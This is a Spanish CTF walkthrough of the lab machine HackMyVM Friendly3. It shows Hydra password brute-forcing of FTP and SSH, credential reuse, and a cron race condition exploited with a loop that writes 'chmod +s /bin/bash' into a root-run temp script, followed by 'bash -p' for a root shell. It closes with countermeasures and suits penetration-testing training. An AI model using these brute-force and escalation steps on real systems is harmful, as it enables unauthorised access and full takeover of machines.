# Máquina Friendly3 - HackMyVM

**Plataforma:** [Máquina Friendly3](https://hackmyvm.eu/machines/machine.php?vm=Friendly3)
**Dificultad:** Fácil
**SO:** Linux (Debian)
**Autor del reto:** —
**Técnicas:** Fuerza bruta FTP (Hydra), Reutilización de credenciales SSH, Cron job race condition, SUID abuse (bash -p)

---

## Índice

1. [Reconocimiento — Escaneo de puertos](#1-reconocimiento--escaneo-de-puertos)
2. [Fuerza bruta FTP](#2-fuerza-bruta-ftp)
3. [Enumeración FTP — Descarga y análisis de contenido](#3-enumeración-ftp--descarga-y-análisis-de-contenido)
4. [Acceso inicial — SSH con credenciales reutilizadas](#4-acceso-inicial--ssh-con-credenciales-reutilizadas)
5. [Enumeración del sistema](#5-enumeración-del-sistema)
6. [Escalada de privilegios — Cron job race condition](#6-escalada-de-privilegios--cron-job-race-condition)
7. [Resumen de vulnerabilidades](#7-resumen-de-vulnerabilidades)
8. [Contramedidas recomendadas](#8-contramedidas-recomendadas)
9. [Herramientas utilizadas](#9-herramientas-utilizadas)

---

## 1. Reconocimiento — Escaneo de puertos

Realizamos un escaneo completo de puertos con `nmap` para identificar los servicios expuestos en la máquina objetivo:

```bash
┌──(root㉿kali)-[~/friendly3]
└─# nmap -p- --open -sSCV --min-rate 5000 -n -vvv -Pn 192.168.100.10 -oN friendly3.txt

# Nmap 7.98 scan initiated Thu Apr 23 11:53:42 2026 as: /usr/lib/nmap/nmap -p- --open -sSCV --min-rate 5000 -n -vvv -Pn -oN friendly3.txt 192.168.100.10
Nmap scan report for 192.168.100.10
Host is up, received arp-response (0.0011s latency).
Scanned at 2026-04-23 11:53:43 CEST for 49s
Not shown: 53055 filtered tcp ports (no-response), 12477 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFC2DVBfq6sqSsCS9Jg+TZN7bqZ4U5G/tKb5dD3M69VVHwPRuMmify8CmxFhlP33nMhZTvYSZIpjGuiPSjks5UA=
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICDxFT3mwConXgCXORTtuda6Onx3sMQgZb6CzY2tWc3l
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
| http-methods:
|_  Supported Methods: GET HEAD
MAC Address: 08:00:27:7B:22:9F (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 23 11:54:32 2026 -- 1 IP address (1 host up) scanned in 49.23 seconds
```

| Parámetro | Descripción |
|-----------|-------------|
| `-p-` | Escanea todos los puertos (1–65535) |
| `--open` | Muestra solo puertos abiertos |
| `-sSCV` | Combinación de SYN scan (`-sS`), detección de versión (`-sV`) y scripts NSE (`-sC`) |
| `--min-rate 5000` | Envía al menos 5000 paquetes por segundo |
| `-n` | No resuelve nombres DNS |
| `-vvv` | Verbosidad máxima |
| `-Pn` | Omite el ping previo (asume host activo) |
| `-oN friendly3.txt` | Guarda la salida en formato normal |

> Se identifican tres puertos abiertos: **21/tcp (FTP — vsftpd 3.0.3)**, **22/tcp (SSH — OpenSSH 9.2p1)** y **80/tcp (HTTP — nginx 1.22.1)**.

---

## 2. Fuerza bruta FTP

Lanzamos un ataque de fuerza bruta con `hydra` contra el servicio FTP para intentar obtener credenciales válidas. También se podría usar el módulo de Metasploit `scanner/ftp/ftp_login`.

```bash
┌──(root㉿kali)-[~/friendly3]
└─# hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.100.10
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).                                                                     
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-23 12:20:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.100.10:21/
[21][ftp] host: 192.168.100.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-23 12:21:01
```

| Parámetro | Descripción |
|-----------|-------------|
| `-l juan` | Usuario a probar |
| `-P /usr/share/wordlists/rockyou.txt` | Diccionario de contraseñas |
| `ftp://192.168.100.10` | Protocolo y host objetivo |

> Credenciales de FTP obtenidas: usuario `juan`, contraseña `alexis`.

---

## 3. Enumeración FTP — Descarga y análisis de contenido

### Conexión FTP

Nos conectamos al servicio FTP con las credenciales obtenidas para explorar el contenido disponible:

```bash
┌──(root㉿kali)-[~/friendly3]
└─# ftp juan@192.168.100.10
Connected to 192.168.100.10.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
...
-rw-r--r--    1 0        0              36 Jun 25  2023 file80
-rw-r--r--    1 0        0               0 Jun 25  2023 file81
-rw-r--r--    1 0        0               0 Jun 25  2023 file82
-rw-r--r--    1 0        0               0 Jun 25  2023 file83
-rw-r--r--    1 0        0               0 Jun 25  2023 file84
-rw-r--r--    1 0        0               0 Jun 25  2023 file85
...
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold5
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold6
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold7
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold8
drwxr-xr-x    2 0        0            4096 Jun 25  2023 fold9
-rw-r--r--    1 0        0              58 Jun 25  2023 fole32
...
226 Directory send OK.
```

### Descarga recursiva del contenido

Como hay una gran cantidad de archivos y carpetas podemos descargar a nuestra máquina toda la información. El problema es que no podemos usar el clásico comando *mget* ya que este únicamente descarga los archivos, no los directorios. Podemos solucionar este problema con el comando *wget*:

```bash
┌──(root㉿kali)-[~/friendly3]
└─# wget -r ftp://juan:alexis@192.168.100.10

┌──(root㉿kali)-[~/friendly3]
└─# ls
192.168.100.10  friendly3.txt
```

| Parámetro | Descripción |
|-----------|-------------|
| `-r` | Descarga recursiva de todos los archivos y directorios |
| `ftp://juan:alexis@...` | URL FTP con credenciales embebidas |

### Análisis del contenido descargado

Ahora con todo el contenido descargado, procedemos a revisar los archivos en busca de información relevante:

```bash
┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# cat file80
Hi, I´m the sysadmin. I am bored...

┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# cat fold5/yt.txt
Thanks to all my YT subscribers!

┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# cat fold8/passwd.txt
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿
⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿
⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿
⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿
⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿
⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿
⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿
⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡈⠑⠢⢄⡀⠈⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿

┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# cat fole32
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabba
```

### Búsqueda de archivos ocultos

Parece complicado encontrar información de interés pero sería conveniente ver los archivos ocultos con *tree -a*, lo que nos permite encontrar más información:

```bash
┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# tree -a
...
├── fold10
│   └── .test.txt
...

┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# cat fold10/.test.txt
Hi, I'am juan another time. I want you to know that I found "cookie" in a file called "zlcnffjbeq.gkg" into my home folder. I think it's from another user, IDK...
```

> **Nota:** El nombre del archivo `zlcnffjbeq.gkg` decodificado con ROT13 es `mypassword.txt`. El contenido mencionado (`cookie`) podría ser la contraseña de otro usuario del sistema.

## 4. Acceso inicial — SSH con credenciales reutilizadas

No hemos encontrado nada más de utilidad directa en el FTP, por lo que probamos a acceder por SSH con las mismas credenciales (`juan:alexis`):

```bash
┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# ssh juan@192.168.100.10
...
juan@friendly3:~$ ls -la
total 28
drwxr-xr-x  3 juan juan 4096 Jul 17  2023 .
drwxr-xr-x  4 root root 4096 Jun 25  2023 ..
lrwxrwxrwx  1 root root    9 Jun 25  2023 .bash_history -> /dev/null
-rw-r--r--  1 juan juan  220 Apr 23  2023 .bash_logout
-rw-r--r--  1 juan juan 3526 Apr 23  2023 .bashrc
drwxr-xr-x 14 root root 4096 Jun 25  2023 ftp
-rw-r--r--  1 juan juan  807 Apr 23  2023 .profile
-r--------  1 juan juan   33 Jul 17  2023 user.txt
juan@friendly3:~$ cat user.txt
...
```

> **¡Flag de usuario obtenida!** Acceso conseguido como `juan` mediante reutilización de credenciales FTP en SSH.

> **Nota:** El ataque con hydra sobre este protocolo sería igual que sobre FTP: *hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.10*.

### Enumeración de usuarios del sistema

Dentro del sistema también vemos que existe el usuario `blue`, cuya contraseña podemos intentar encontrar con hydra:

```bash
juan@friendly3:~$ grep -v nologin /etc/passwd
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
juan:x:1001:1001::/home/juan:/bin/bash
blue:x:1002:1002::/home/blue:/bin/bash
```

Lanzamos hydra contra SSH para intentar obtener las credenciales del usuario `blue`:

```bash
┌──(root㉿kali)-[~/friendly3/192.168.100.10]
└─# hydra -l blue -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.10
...
```

---

## 5. Enumeración del sistema

### Búsqueda de binarios SUID

Miramos archivos con al menos permiso de SUID pero no encontramos nada destacable:

```bash
juan@friendly3:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
```

| Parámetro | Descripción |
|-----------|-------------|
| `-perm -4000` | Busca archivos con bit SUID activo |
| `2>/dev/null` | Redirige errores al vacío |

### Búsqueda de scripts ejecutables

Miramos ahora los archivos con extensión `.sh` por si alguno pudiera ser de nuestro interés y encontramos un archivo relevante en `/opt`:

```bash
juan@friendly3:~$ find / -name *.sh 2>/dev/null
...
/opt/check_for_install.sh
...
```

### Análisis del script vulnerable

Vemos qué realiza el archivo en cuestión:

```bash
juan@friendly3:~$ cat /opt/check_for_install.sh
#!/bin/bash

/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```

> Este script descarga un archivo de `http://127.0.0.1/9842734723948024.bash`, le asigna permisos de lectura, escritura y ejecución a todos (`chmod +w`), lo ejecuta como root y después lo elimina. La ventana de tiempo entre la escritura y la ejecución permite una **race condition**.

---

## 6. Escalada de privilegios — Cron job race condition

### Confirmación del cron job con pspy64

Vamos a usar la herramienta *pspy64* que muestra procesos del sistema incluso sin permisos de root, así podemos ver si este script se ejecuta en segundo plano o de forma periódica.

Descargamos y transferimos `pspy64` a la máquina víctima:

```bash
┌──(root㉿kali)-[~]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -P /tmp/

┌──(root㉿kali)-[/tmp]
└─# cd /tmp

┌──(root㉿kali)-[/tmp]
└─# scp pspy64 juan@192.168.100.10:~
juan@192.168.100.10's password:
pspy64 
```

> **Nota:** También podríamos descargarlo en la máquina víctima con *wget* y levantando con python3 un servidor web en un puerto no conflictivo, por ejemplo el 8000.

Ejecutamos `pspy64` para monitorizar los procesos:

```bash
juan@friendly3:~$ chmod +x pspy64
juan@friendly3:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/04/23 08:02:26 CMD: UID=1001  PID=2881   | ./pspy64
2026/04/23 08:02:26 CMD: UID=0     PID=2879   |
...
2026/04/23 08:02:26 CMD: UID=0     PID=1      | /sbin/init
2026/04/23 08:03:01 CMD: UID=0     PID=2888   | /usr/sbin/CRON -f
2026/04/23 08:03:01 CMD: UID=0     PID=2889   | /bin/sh -c /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2890   | /bin/sh -c /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2891   | /bin/bash /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2892   | /bin/bash /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2893   | /bin/bash /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2894   | /bin/bash /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2895   | /bin/bash /opt/check_for_install.sh
2026/04/23 08:03:01 CMD: UID=0     PID=2896   | /bin/bash /opt/check_for_install.sh
```

> Se confirma que el script `/opt/check_for_install.sh` se ejecuta de forma periódica como **root** (UID=0) mediante un cron job.

### Explotación de la race condition

Vemos que de forma periódica se ejecuta el script `/opt/check_for_install.sh` por lo que si conseguimos ejecutar nuestro propio código podemos obtener una shell con permisos de root.

Creamos un script que sobreescribe continuamente `/tmp/a.bash` con un comando que activa el bit SUID en `/bin/bash`:

```bash
juan@friendly3:/tmp$ cat a.bash
#!/bin/bash

while true
do
    echo "chmod +s /bin/bash" > /tmp/a.bash
done
```

Ejecutamos el script y verificamos el estado del binario:

```bash
juan@friendly3:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash

juan@friendly3:/tmp$ bash a.bash
```

Al cabo de un rato se modifica el SUID:

```bash
juan@friendly3:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

> El bit SUID se ha activado en `/bin/bash` (se observa la `s` en los permisos: `-rwsr-sr-x`).

### Obtención de root

Ahora el binario de `/bin/bash` tiene el bit SUID activado por lo que se ejecutará como root. El parámetro `-p` hace que bash conserve los privilegios especiales del archivo ejecutable (como el SUID) en lugar de eliminarlos automáticamente por seguridad, lo que quiere decir que si /bin/bash tiene SUID activado se ejecuta como el usuario propietario del binario, no como el usuario que lo ejecuta:

```bash
juan@friendly3:/tmp$ bash -p

bash-5.2# whoami
root

bash-5.2# cd /root
bash-5.2# ls
interfaces.sh  root.txt

bash-5.2# cat root.txt
...
```

| Parámetro | Descripción |
|-----------|-------------|
| `-p` | Conserva los privilegios del propietario del binario (no descarta SUID) |

> **¡Escalada completada!** Somos `root`. Flag de root obtenida en `/root/root.txt`.

---

## 7. Resumen de vulnerabilidades

| # | Vulnerabilidad | CVE | Criticidad | Impacto |
|---|---------------|-----|------------|---------|
| 1 | Credenciales FTP débiles (fuerza bruta) | — | Media | Acceso al servicio FTP como `juan` |
| 2 | Reutilización de credenciales FTP en SSH | — | Alta | Acceso SSH al sistema como `juan` |
| 3 | Cron job con race condition en `/tmp` | — | Crítica | Ejecución de código arbitrario como `root` |
| 4 | Abuso de SUID en `/bin/bash` | — | Crítica | Escalada completa a `root` |

---

## 8. Contramedidas recomendadas

1. **Política de contraseñas robustas**: Implementar contraseñas complejas y no basadas en diccionario para evitar ataques de fuerza bruta.
2. **No reutilizar credenciales entre servicios**: Usar contraseñas diferentes para FTP y SSH para limitar el impacto de una filtración.
3. **Ejecución segura de scripts con cron**: No escribir archivos temporales en `/tmp` con permisos amplios; usar directorios restringidos y rutas absolutas con permisos mínimos.
4. **Eliminar la race condition**: Generar nombres de archivo temporales únicos (con `mktemp`) y verificar la integridad antes de ejecutar.
5. **Monitorización de bits SUID**: Implementar auditoría periódica de binarios con bit SUID/SGID activo para detectar modificaciones no autorizadas.
6. **Configuración de FTP seguro**: Considerar el uso de SFTP en lugar de FTP y restringir el acceso con listas de control.

---

## 9. Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos, detección de servicios y versiones |
| `hydra` | Fuerza bruta de credenciales FTP y SSH |
| `ftp` | Conexión y exploración del servicio FTP |
| `wget` | Descarga recursiva del contenido FTP |
| `tree` | Listado de archivos y directorios incluyendo ocultos |
| `ssh` | Acceso remoto a la máquina objetivo |
| `scp` | Transferencia de archivos a la máquina víctima |
| `find` | Búsqueda de binarios SUID y scripts ejecutables |
| `pspy64` | Monitorización de procesos sin privilegios de root |
| `bash -p` | Shell privilegiada tras explotación de bit SUID |
